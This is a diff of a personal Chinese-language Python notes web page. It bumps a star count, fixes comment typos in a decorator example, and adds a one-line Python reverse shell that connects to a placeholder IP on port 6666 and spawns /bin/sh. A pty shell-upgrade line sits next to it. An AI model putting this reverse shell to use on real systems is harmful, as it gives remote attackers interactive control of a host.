@@ -16,7 +16,7 @@
 
         <section id="downloads">
           
-          <a href="https://github.com/zjuchenyuan/notebook/blob/master/Python.md" class="btn btn-github"><span class="icon"></span>Star me on GitHub (53)</a>&nbsp;<a href="https://py3.io" class="btn btn-back"><span class="icon"></span>Back to Index</a>
+          <a href="https://github.com/zjuchenyuan/notebook/blob/master/Python.md" class="btn btn-github"><span class="icon"></span>Star me on GitHub (54)</a>&nbsp;<a href="https://py3.io" class="btn btn-back"><span class="icon"></span>Back to Index</a>
         </section>
       </div>
     </header>
@@ -68,6 +68,12 @@ trusted-host=pypi.doubanio.com
 </code></pre>
 </div>
 
+<p>单行版本：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>IP="x.x.x.x";PORT=6666;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( IP , PORT ));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
+</code></pre>
+</div>
+
 <h2 id="tty">获得一个tty</h2>
 
 <div class="highlighter-rouge"><pre class="highlight"><code>python -c 'import pty; pty.spawn("/bin/sh")'
@@ -94,8 +100,8 @@ trusted-host=pypi.doubanio.com
     <span class="k">def</span> <span class="nf">newfunc</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>  <span class="c"># args是参数列表list，kwargs是带有名称keyword的参数dict</span>
         <span class="n">newargs</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">parameter_index</span><span class="p">:</span>  <span class="c"># 如果这个参数被直接传入，那么肯定其前面的参数都是无名称的参数，args的长度肯定长于其所在的位置</span>
-            <span class="n">newargs</span><span class="p">[</span><span class="n">parameter_index</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">parameter_value</span>  <span class="c"># 第3个参数在list的下表是2</span>
-        <span class="k">else</span><span class="p">:</span>  <span class="c"># 如果不是直接传入，那么就在kwargs中 或者可选参数不存在这个参数，强制更新掉kwargs即可</span>
+            <span class="n">newargs</span><span class="p">[</span><span class="n">parameter_index</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">parameter_value</span>  <span class="c"># 第3个参数在list的下标是2</span>
+        <span class="k">else</span><span class="p">:</span>  <span class="c"># 如果不是直接传入，那么就在kwargs中 或者传入的可选参数中没有这个参数，直接设置kwargs即可</span>
             <span class="n">kwargs</span><span class="p">[</span><span class="n">parameter_name</span><span class="p">]</span> <span class="o">=</span> <span class="n">parameter_value</span>
         <span class="k">return</span> <span class="n">real_func</span><span class="p">(</span><span class="o">*</span><span class="n">newargs</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">newfunc</span>
